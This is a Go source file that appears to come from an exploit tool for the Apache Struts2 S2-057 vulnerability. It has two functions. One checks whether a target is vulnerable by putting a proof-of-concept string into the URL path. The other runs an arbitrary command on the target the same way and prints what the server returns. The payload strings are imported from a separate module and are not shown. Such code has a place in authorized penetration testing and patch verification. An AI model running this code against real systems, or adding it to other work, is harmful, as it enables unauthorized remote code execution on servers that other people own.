package s057

import (
	"ST2G/cvemod/x51utils"
	"fmt"
	"io/ioutil"
	"log"
	"net/http"
	"strings"
	"time"
)


func Check(targeturl string){
	actionIndex := strings.LastIndexAny(targeturl,"/")
	targeturl =targeturl[:actionIndex]+x51utils.POC_s057_check+targeturl[actionIndex:]
	req, err := http.NewRequest("GET", targeturl, nil)
	if err != nil {
		log.Fatal("Error reading request. ", err)
	}
	client := &http.Client{Timeout: time.Second * 10}
	resp, err := client.Do(req)

	if err != nil {
		log.Fatal("Error reading response. 访问出错")
	}
	defer resp.Body.Close()

	body, err := ioutil.ReadAll(resp.Body)
	if err != nil {
		log.Fatal("Error reading body. ", err)
	}
	respBody := string(body)
	isVulnable := strings.Contains(respBody, "6308")
	if isVulnable {
		x51utils.Colorlog("Found Struts2-057!")

	} else {
		fmt.Println("Struts2-057 Not Vulnerable.")
	}
}
func ExecCommand(targeturl string,command string) {
	actionIndex := strings.LastIndexAny(targeturl,"/")
	targeturl =targeturl[:actionIndex]+x51utils.POC_s057_exec(command)+targeturl[actionIndex:]
	req, err := http.NewRequest("GET", targeturl, nil)
	if err != nil {
		log.Fatal("Error reading request. ", err)
	}
	client := &http.Client{Timeout: time.Second * 10}

	resp, err := client.Do(req)
	if err != nil {
		log.Fatal("Error reading response. ", err)
	}
	defer resp.Body.Close()

	body, err := ioutil.ReadAll(resp.Body)
	if err != nil {
		log.Fatal("Error reading body. ", err)
	}
	respBody := string(body)
	fmt.Println(respBody)
}